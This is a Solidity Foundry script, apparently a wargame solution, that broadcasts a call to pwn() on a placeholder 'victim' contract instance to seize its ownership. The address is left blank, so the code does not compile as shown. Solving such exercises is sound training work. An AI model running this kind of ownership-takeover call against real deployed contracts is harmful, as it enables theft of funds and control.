//SPDX-License-Identifier: MIT

pragma solidity 0.8.20;

import {Script} from "forge-std/Script.sol";

contract AttackScript is Script {
	address victim = /* Your address instance */ ; 	
	
function run() public {
	vm.startBroadcast();
	(bool success, ) = victim.call(abi.encodeWithSignature("pwn()"));
	vm.stopBroadcast();
}
}
